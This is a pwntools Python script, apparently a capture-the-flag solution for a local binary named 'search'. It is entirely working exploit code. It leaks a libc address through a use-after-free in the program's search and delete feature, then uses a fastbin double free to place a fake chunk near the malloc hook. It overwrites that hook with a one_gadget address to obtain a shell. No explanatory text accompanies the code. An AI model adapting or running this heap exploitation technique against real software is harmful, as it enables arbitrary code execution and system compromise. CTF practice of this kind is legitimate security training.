from pwn import *
p=process('./search')
context.log_level='info'

def Search(word):
	p.recvuntil('3: Quit\n',timeout=3)
	p.sendline('1')
	p.recvuntil('Enter the word size:\n')
	p.sendline(str(len(word)))
	p.recvuntil('Enter the word:\n')
	p.send(word)


def Index(word):
	p.recvuntil('3: Quit\n',timeout=3)
	p.sendline('2')
	p.recvuntil('Enter the sentence size:\n')
	p.sendline(str(len(word)))
	p.recvuntil('Enter the sentence:\n')
	p.send(word)

def leak():
	Index('a'*0x86+' m')
	Search('m')
	p.recvuntil('Delete this sentence (y/n)?\n')
	p.sendline('y')
	#gdb.attach(p,'b *0x400b1f')
	Search('\x00')
	p.recvuntil('Found 136: ')
	unsortbin_addr = u64(p.recv(8))
	p.recvuntil('Delete this sentence (y/n)?\n')
	p.sendline('n')
	log.info("success unsort bin addr: "+hex(unsortbin_addr))
	return unsortbin_addr

unsortbin_addr=leak()
Index('a'*0x5e+' m')
Index('b'*0x5e+' m')
Index('c'*0x5e+' m')
Search('m')
p.sendlineafter('Delete this sentence (y/n)?\n','y')
p.sendlineafter('Delete this sentence (y/n)?\n','y')
p.sendlineafter('Delete this sentence (y/n)?\n','y')
Search('\x00')

p.sendlineafter('Delete this sentence (y/n)?\n','y')
p.sendlineafter('Delete this sentence (y/n)?\n','n')
p.sendlineafter('Delete this sentence (y/n)?\n','n')
main_arena_addr=unsortbin_addr-88
libc_addr=main_arena_addr-0x3c4b20
fake_heap_addr=main_arena_addr-0x33
log.success('fakeheap:'+hex(fake_heap_addr))

Index(p64(fake_heap_addr).ljust(0x60,'d'))
gdb.attach(p)
pause()
Index('e'*0x60)
Index('f'*0x60)
one_gadget_addr=libc_addr+0xf02a4 #0x45216 0x4526a 0xf02a4 0xf1147
payload='g'*19+p64(one_gadget_addr)
payload=payload.ljust(0x60,'g')
#pause()
Index(payload)
p.interactive()

